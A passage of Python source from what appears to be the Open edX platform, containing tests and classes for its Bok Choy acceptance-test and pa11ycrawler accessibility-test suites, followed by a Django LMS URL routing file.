        )
        suite = BokChoyTestSuite('', num_processes=1)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_verbosity_settings_2_processes(self):
        """
        Using multiple processes means specific xunit, coloring, and process-related settings should
        be used.
        """
        process_count = 2
        expected_verbosity_string = (
            "--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml"
            " --processes={procs} --no-color --process-timeout=1200".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else '',
                procs=process_count
            )
        )
        suite = BokChoyTestSuite('', num_processes=process_count)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_verbosity_settings_3_processes(self):
        """
        With the above test, validate that num_processes can be set to various values
        """
        process_count = 3
        expected_verbosity_string = (
            "--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml"
            " --processes={procs} --no-color --process-timeout=1200".format(
                repo_dir=REPO_DIR,
                shard_str='/shard_' + self.shard if self.shard else '',
                procs=process_count
            )
        )
        suite = BokChoyTestSuite('', num_processes=process_count)
        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)

    def test_invalid_verbosity_and_processes(self):
        """
        If an invalid combination of verbosity and number of processors is passed in, a
        BuildFailure should be raised
        """
        suite = BokChoyTestSuite('', num_processes=2, verbosity=3)
        with self.assertRaises(BuildFailure):
            BokChoyTestSuite.verbosity_processes_string(suite)


class TestPaverPa11yCrawlerCmd(unittest.TestCase):

    """
    Paver pa11ycrawler command test cases.  Most of the functionality is
    inherited from BokChoyTestSuite, so those tests aren't duplicated.
    """

    def setUp(self):
        super(TestPaverPa11yCrawlerCmd, self).setUp()

        # Mock shell commands
        mock_sh = patch('pavelib.utils.test.suites.bokchoy_suite.sh')
        self._mock_sh = mock_sh.start()

        # Cleanup mocks
        self.addCleanup(mock_sh.stop)

    def _expected_command(self, report_dir, start_urls):
        """
        Returns the expected command to run pa11ycrawler.
        """
        expected_statement = (
            'pa11ycrawler run {start_urls} '
            '--pa11ycrawler-allowed-domains=localhost '
            '--pa11ycrawler-reports-dir={report_dir} '
            '--pa11ycrawler-deny-url-matcher=logout '
            '--pa11y-reporter="1.0-json" '
            '--depth-limit=6 '
        ).format(
            start_urls=' '.join(start_urls),
            report_dir=report_dir,
        )
        return expected_statement

    def test_default(self):
        suite = Pa11yCrawler('')
        self.assertEqual(
            suite.cmd,
            self._expected_command(suite.pa11y_report_dir, suite.start_urls)
        )

    def test_get_test_course(self):
        suite = Pa11yCrawler('')
        suite.get_test_course()
        self._mock_sh.assert_has_calls([
            call(
                'wget {targz} -O {dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)),
            call(
                'tar zxf {dir}demo_course.tar.gz -C {dir}'.format(dir=suite.imports_dir)),
        ])

    def test_generate_html_reports(self):
        suite = Pa11yCrawler('')
        suite.generate_html_reports()
        self._mock_sh.assert_has_calls([
            call(
                'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)),
        ])

"""
Class used for defining and running Bok Choy acceptance test suite
"""
from time import sleep
from urllib import urlencode

from common.test.acceptance.fixtures.course import CourseFixture, FixtureError

from path import Path as path
from paver.easy import sh, BuildFailure
from pavelib.utils.test.suites.suite import TestSuite
from pavelib.utils.envs import Env
from pavelib.utils.test import bokchoy_utils
from pavelib.utils.test import utils as test_utils

import os

try:
    from pygments.console import colorize
except ImportError:
    colorize = lambda color, text: text

__test__ = False  # do not collect

DEFAULT_NUM_PROCESSES = 1
DEFAULT_VERBOSITY = 2


class BokChoyTestSuite(TestSuite):
    """
    TestSuite for running Bok Choy tests
    Properties (below is a subset):
      test_dir - parent directory for tests
      log_dir - directory for test output
      report_dir - directory for reports (e.g., coverage) related to test execution
      xunit_report - directory for xunit-style output (xml)
      fasttest - when set, skip various set-up tasks (e.g., collectstatic)
      serversonly - prepare and run the necessary servers, only stopping when interrupted with Ctrl-C
      testsonly - assume servers are running (as per above) and run tests with no setup or cleaning of environment
      test_spec - when set, specifies test files, classes, cases, etc. See platform doc.
      default_store - modulestore to use when running tests (split or draft)
      num_processes - number of processes or threads to use in tests. Recommendation is that this
      is less than or equal to the number of available processors.
      verify_xss - when set, check for XSS vulnerabilities in the page HTML.
      See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html
    """
    def __init__(self, *args, **kwargs):
        super(BokChoyTestSuite, self).__init__(*args, **kwargs)
        self.test_dir = Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests')
        self.log_dir = Env.BOK_CHOY_LOG_DIR
        self.report_dir = kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR)
        self.xunit_report = self.report_dir / "xunit.xml"
        self.cache = Env.BOK_CHOY_CACHE
        self.fasttest = kwargs.get('fasttest', False)
        self.serversonly = kwargs.get('serversonly', False)
        self.testsonly = kwargs.get('testsonly', False)
        self.test_spec = kwargs.get('test_spec', None)
        self.default_store = kwargs.get('default_store', None)
        self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)
        self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)
        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))                    
        self.extra_args = kwargs.get('extra_args', '')
        self.har_dir = self.log_dir / 'hars'
        self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE
        self.imports_dir = kwargs.get('imports_dir', None)
        self.coveragerc = kwargs.get('coveragerc', None)
        self.save_screenshots = kwargs.get('save_screenshots', False)

    def __enter__(self):
        super(BokChoyTestSuite, self).__enter__()

        # Ensure that we have a directory to put logs and reports
        self.log_dir.makedirs_p()
        self.har_dir.makedirs_p()
        self.report_dir.makedirs_p()
        test_utils.clean_reports_dir()      # pylint: disable=no-value-for-parameter

        if not (self.fasttest or self.skip_clean or self.testsonly):
            test_utils.clean_test_files()

        msg = colorize('green', "Checking for mongo, memchache, and mysql...")
        print msg
        bokchoy_utils.check_services()

        if not self.testsonly:
            self.prepare_bokchoy_run()
        else:
            # load data in db_fixtures
            self.load_data()

        msg = colorize('green', "Confirming servers have started...")
        print msg
        bokchoy_utils.wait_for_test_servers()
        try:
            # Create course in order to seed forum data underneath. This is
            # a workaround for a race condition. The first time a course is created;
            # role permissions are set up for forums.
            CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install()
            print 'Forums permissions/roles data has been seeded'
        except FixtureError:
            # this means it's already been done
            pass

        if self.serversonly:
            self.run_servers_continuously()

    def __exit__(self, exc_type, exc_value, traceback):
        super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback)

        # Using testsonly will leave all fixtures in place (Note: the db will also be dirtier.)
        if self.testsonly:
            msg = colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.')
            print msg
        else:
            # Clean up data we created in the databases
            msg = colorize('green', "Cleaning up databases...")
            print msg
            sh("./manage.py lms --settings bok_choy flush --traceback --noinput")
            bokchoy_utils.clear_mongo()

    def verbosity_processes_string(self):
        """
        Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct
        the proper combination for use with nosetests.
        """
        substring = []

        if self.verbosity != DEFAULT_VERBOSITY and self.num_processes != DEFAULT_NUM_PROCESSES:
            msg = 'Cannot pass in both num_processors and verbosity. Quitting'
            raise BuildFailure(msg)

        if self.num_processes != 1:
            # Construct "multiprocess" nosetest substring
            substring = [
                "--with-xunitmp --xunitmp-file={}".format(self.xunit_report),
                "--processes={}".format(self.num_processes),
                "--no-color --process-timeout=1200"
            ]

        else:
            substring = [
                "--with-xunit",
                "--xunit-file={}".format(self.xunit_report),
                "--verbosity={}".format(self.verbosity),
            ]

        return " ".join(substring)

    def prepare_bokchoy_run(self):
        """
        Sets up and starts servers for a Bok Choy run. If --fasttest is not
        specified then static assets are collected
        """
        sh("{}/scripts/reset-test-db.sh".format(Env.REPO_ROOT))

        if not self.fasttest:
            self.generate_optimized_static_assets()

        # Clear any test data already in Mongo or MySQLand invalidate
        # the cache
        bokchoy_utils.clear_mongo()
        self.cache.flush_all()

        # load data in db_fixtures
        self.load_data()

        # load courses if self.imports_dir is set
        self.load_courses()

        # Ensure the test servers are available
        msg = colorize('green', "Confirming servers are running...")
        print msg
        bokchoy_utils.start_servers(self.default_store, self.coveragerc)

    def load_courses(self):
        """
        Loads courses from self.imports_dir.

        Note: self.imports_dir is the directory that contains the directories
        that have courses in them. For example, if the course is located in
        `test_root/courses/test-example-course/`, self.imports_dir should be
        `test_root/courses/`.
        """
        msg = colorize('green', "Importing courses from {}...".format(self.imports_dir))
        print msg

        if self.imports_dir:
            sh(
                "DEFAULT_STORE={default_store}"
                " ./manage.py cms --settings=bok_choy import {import_dir}".format(
                    default_store=self.default_store,
                    import_dir=self.imports_dir
                )
            )

    def load_data(self):
        """
        Loads data into database from db_fixtures
        """
        print 'Loading data from json fixtures in db_fixtures directory'
        sh(
            "DEFAULT_STORE={default_store}"
            " ./manage.py lms --settings bok_choy loaddata --traceback"
            " common/test/db_fixtures/*.json".format(
                default_store=self.default_store,
            )
        )

    def run_servers_continuously(self):
        """
        Infinite loop. Servers will continue to run in the current session unless interrupted.
        """
        print 'Bok-choy servers running. Press Ctrl-C to exit...\n'
        print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\n'

        while True:
            try:
                sleep(10000)
            except KeyboardInterrupt:
                print "Stopping bok-choy servers.\n"
                break

    @property
    def cmd(self):
        """
        This method composes the nosetests command to send to the terminal. If nosetests aren't being run,
         the command returns an empty string.
        """
        # Default to running all tests if no specific test is specified
        if not self.test_spec:
            test_spec = self.test_dir
        else:
            test_spec = self.test_dir / self.test_spec

        # Skip any additional commands (such as nosetests) if running in
        # servers only mode
        if self.serversonly:
            return ""

        # Construct the nosetests command, specifying where to save
        # screenshots and XUnit XML reports
        cmd = [
            "DEFAULT_STORE={}".format(self.default_store),
            "SCREENSHOT_DIR='{}'".format(self.log_dir),
            "BOK_CHOY_HAR_DIR='{}'".format(self.har_dir),
            "BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'".format(self.a11y_file),
            "SELENIUM_DRIVER_LOG_DIR='{}'".format(self.log_dir),
            "VERIFY_XSS='{}'".format(self.verify_xss),
            "nosetests",
            test_spec,
            "{}".format(self.verbosity_processes_string())
        ]
        if self.pdb:
            cmd.append("--pdb")
        if self.save_screenshots:
            cmd.append("--with-save-baseline")
        cmd.append(self.extra_args)

        cmd = (" ").join(cmd)
        return cmd


class Pa11yCrawler(BokChoyTestSuite):
    """
    Sets up test environment with mega-course loaded, and runs pa11ycralwer
    against it.
    """

    def __init__(self, *args, **kwargs):
        super(Pa11yCrawler, self).__init__(*args, **kwargs)
        self.course_key = kwargs.get('course_key')
        if self.imports_dir:
            # If imports_dir has been specified, assume the files are
            # already there -- no need to fetch them from github. This
            # allows someome to crawl a different course. They are responsible
            # for putting it, un-archived, in the directory.
            self.should_fetch_course = False
        else:
            # Otherwise, obey `--skip-fetch` command and use the default
            # test course.  Note that the fetch will also be skipped when
            # using `--fast`.
            self.should_fetch_course = kwargs.get('should_fetch_course')
            self.imports_dir = path('test_root/courses/')

        self.pa11y_report_dir = os.path.join(self.report_dir, 'pa11ycrawler_reports')
        self.tar_gz_file = "https://github.com/edx/demo-test-course/archive/master.tar.gz"

        self.start_urls = []
        auto_auth_params = {
            "redirect": 'true',
            "staff": 'true',
            "course_id": self.course_key,
        }
        cms_params = urlencode(auto_auth_params)
        self.start_urls.append("\"http://localhost:8031/auto_auth?{}\"".format(cms_params))

        sequence_url = "/api/courses/v1/blocks/?{}".format(
            urlencode({
                "course_id": self.course_key,
                "depth": "all",
                "all_blocks": "true",
            })
        )
        auto_auth_params.update({'redirect_to': sequence_url})
        lms_params = urlencode(auto_auth_params)
        self.start_urls.append("\"http://localhost:8003/auto_auth?{}\"".format(lms_params))

    def __enter__(self):
        if self.should_fetch_course:
            self.get_test_course()
        super(Pa11yCrawler, self).__enter__()

    def get_test_course(self):
        """
        Fetches the test course.
        """
        self.imports_dir.makedirs_p()
        zipped_course = self.imports_dir + 'demo_course.tar.gz'

        msg = colorize('green', "Fetching the test course from github...")
        print msg

        sh(
            'wget {tar_gz_file} -O {zipped_course}'.format(
                tar_gz_file=self.tar_gz_file,
                zipped_course=zipped_course,
            )
        )

        msg = colorize('green', "Uncompressing the test course...")
        print msg

        sh(
            'tar zxf {zipped_course} -C {courses_dir}'.format(
                zipped_course=zipped_course,
                courses_dir=self.imports_dir,
            )
        )

    def generate_html_reports(self):
        """
        Runs pa11ycrawler json-to-html
        """
        cmd_str = (
            'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}'
        ).format(report_dir=self.pa11y_report_dir)

        sh(cmd_str)

    @property
    def cmd(self):
        """
        Runs pa11ycrawler as staff user against the test course.
        """
        cmd_str = (
            'pa11ycrawler run {start_urls} '
            '--pa11ycrawler-allowed-domains={allowed_domains} '
            '--pa11ycrawler-reports-dir={report_dir} '
            '--pa11ycrawler-deny-url-matcher={dont_go_here} '
            '--pa11y-reporter="{reporter}" '
            '--depth-limit={depth} '
        ).format(
            start_urls=' '.join(self.start_urls),
            allowed_domains='localhost',
            report_dir=self.pa11y_report_dir,
            reporter="1.0-json",
            dont_go_here="logout",
            depth="6",
        )
        return cmd_str

from django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name="root"),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name="dashboard"),
    url(r'^login$', 'student.views.signin_user', name="signin_user"),
    url(r'^register$', 'student.views.register_user', name="register_user"),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name="change_email"),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name="change_name"),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name="accounts_login"),

    url(r'^login_ajax$', 'student.views.login_user', name="login"),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name="activate"),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name="begin_exam_registration"),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES["USE_CUSTOM_THEME"]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name="university_profile"),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name="404"),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES["USE_CUSTOM_THEME"]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name="jobs"),
        url(r'^press$', 'student.views.press', name="press"),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name="media-kit"),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name="faq_edx"),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name="help_edx"),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name="copyright"),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == "ROOT" or key == "COURSES" or key == "FAQ":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = "%s.html" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES["USE_CUSTOM_THEME"]:
        template = "theme-" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name="course_wiki"),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name="jump_to"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name="user_software_license"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name="courses"),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name="change_enrollment"),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name="about_course"),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name="mktg_about_course"),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name="mktg_about_course"),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name="course_root"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name="info"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name="syllabus"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',                    
            'staticbook.views.index', name="book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',                    
            'staticbook.views.index'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',
            'staticbook.views.index_shifted'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',                    
            'staticbook.views.pdf_index', name="pdf_book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',                    
            'staticbook.views.pdf_index'),                    

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',                    
            'staticbook.views.pdf_index'),                    
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',                    
            'staticbook.views.pdf_index'),                    

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',                    
            'staticbook.views.html_index', name="html_book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',                    
            'staticbook.views.html_index'),                    

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name="courseware"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name="courseware_chapter"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name="courseware_section"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name="courseware_position"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name="progress"),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name="student_progress"),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name="instructor_dashboard"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name="cohorts"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name="add_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name="list_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name="add_to_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name="remove_from_cohort"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name="debug_cohort_mgmt"),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name="masquerade-switch"),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name="news"),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name="static_tab"),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

